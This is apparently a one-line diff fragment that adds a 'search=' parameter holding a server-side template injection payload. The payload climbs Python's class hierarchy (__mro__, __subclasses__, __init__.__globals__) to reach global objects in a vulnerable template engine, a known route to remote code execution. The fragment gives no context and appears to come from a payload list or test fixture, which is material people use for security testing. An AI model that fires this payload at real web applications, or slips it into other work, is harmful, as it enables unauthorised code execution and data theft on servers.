@@ -1,0 +1,1 @@
+search={{"".__class__.__mro__[2].__subclasses__()[70].__init__.__globals__}}
